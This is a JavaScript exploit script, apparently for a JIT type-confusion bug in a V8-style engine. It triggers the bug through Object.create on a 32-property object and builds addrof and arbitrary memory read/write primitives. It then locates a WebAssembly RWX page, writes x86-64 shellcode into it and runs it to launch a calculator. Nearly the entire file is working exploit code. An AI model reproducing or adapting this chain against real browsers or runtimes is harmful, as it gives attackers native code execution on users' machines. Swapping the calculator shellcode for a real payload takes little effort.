// Conversion stuff
let floatView = new Float64Array(1);
let uint64View = new BigUint64Array(floatView.buffer);

// Attacking Array Buffer
var obj = new ArrayBuffer(0x100);
var dv = new DataView(obj);

function toBigint(num){
  floatView[0] = num;
  return uint64View[0];
}
function toNumber(num) {
  uint64View[0] = num;
  return floatView[0];
};

// By default the compiler allocates memory for 32 fast propeties 
function makeobj(pvalue){
  let obj = {inline: 1234};

  for(let i=1;i<=32;i++){
    Object.defineProperty(obj, 'p'+i, {
      writable: true,
      value: pvalue[i]
    });
  }
  return obj;
}

function vuln(obj){
  obj.inline;
  this.Object.create(obj);
  let p1 = obj.p1;
  let p2 = obj.p2;
  let p3 = obj.p3;
  let p4 = obj.p4;
  let p5 = obj.p5;
  let p6 = obj.p6;
  let p7 = obj.p7;
  let p8 = obj.p8;
  let p9 = obj.p9;
  let p10 = obj.p10;
  let p11 = obj.p11;
  let p12 = obj.p12;
  let p13 = obj.p13;
  let p14 = obj.p14;
  let p15 = obj.p15;
  let p16 = obj.p16;
  let p17 = obj.p17;
  let p18 = obj.p18;
  let p19 = obj.p19;
  let p20 = obj.p20;
  let p21 = obj.p21;
  let p22 = obj.p22;
  let p23 = obj.p23;
  let p24 = obj.p24;
  let p25 = obj.p25;
  let p26 = obj.p26;
  let p27 = obj.p27;
  let p28 = obj.p28;
  let p29 = obj.p29;
  let p30 = obj.p30;
  let p31 = obj.p31;
  let p32 = obj.p32;
  return  [p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24, p25, p26, p27, p28, p29, p30, p31, p32]
}

var p1=0, p2=0;
function findpair(arr){
  for(let i=1;i<32;i++){
    if(arr[i-1] < 0){
      p1 = i;
      p2 = (-arr[i-1]);
      return 1;
    }
  }
}

// addrof primitive
function addrof(toleak){
  eval(`
    function hax(obj) {
      let tmp = obj.inline;
      this.Object.create(obj);
      return obj.p${p1}.x;
    }
  `);

  function craft(){
    pvalue = [];
    pvalue[p1] = {x: 13.37, y:13.37}; 
    pvalue[p2] = {y: toleak}; 
    let o = makeobj(pvalue);
    return o;
  }

  for(let i=0;i<10000;i++){
    let res = hax(craft());
    if(res != 13.37){
      return toBigint(res);
    }
  }
}

// write primitive
function write(addr, val){
  if(addr%2n == 1n){
    addr--;
  }
  eval(`
    function hax(obj){
      obj.inline;
      this.Object.create(obj);
      obj.p${p1}.y = ${toNumber(addr)};
      return obj.p${p1}.x;
    }
  `);

  let res;
  for(let i=0;i<10000;i++){
    pvalue = []
    pvalue[p1] = {x: 13.37, y: 69.69};
    pvalue[p2] = obj;
    let o = makeobj(pvalue);
    res = hax(o, addr);
    if(res != 13.37){
      break;
    }
  }
  dv.setUint32(0, val, true);
  return true;
}

function read(addr){
  if(addr%2n == 1n){
    addr--;
  }
  eval(`
    function hax(obj){
      obj.inline;
      this.Object.create(obj);
      obj.p${p1}.y = ${toNumber(addr)};
      return obj.p${p1}.x;
    }
  `);
  let res;
  for(let i=0;i<10000;i++){
    pvalue = []
    pvalue[p1] = {x: 13.37, y: 69.69};
    pvalue[p2] = obj;
    let o = makeobj(pvalue);
    res = hax(o, BigInt(addr));
    if(res != 13.37){
      break;
    }
  }
  return dv.getBigUint64(0, true);
}

// Write the shellcode with the help of array buffer
function shell_write(addr, shellcode){
  for(let i=0;i<shellcode.length;i++){
    write(addr+BigInt(4*i), shellcode[i]);
  }
}

console.log("Generating the posible property values: "); 
// initial properties value
var pvalue = [];
for(let i=1;i<=32;i++){
  pvalue[i] = -i;
}

let res;
for(let i=0;i<10000;i++){
  res = vuln(makeobj(pvalue));
}

console.log("# Leak from the dictionary structure"); 
console.log(res);

findpair(res);
console.log("# Overlapping pair: " + p1 + " " + p2); 

// wasm for RWS shellcode
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

rwx = read(addrof(wasmInstance) + 0xf0n);
console.log("# Address of RWX region: " + rwx.toString(16));

console.log("# Writing shellcode to: " + rwx.toString(16));
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
shell_write(rwx, shellcode);

console.log("# Calling the calculator shellcode");
func();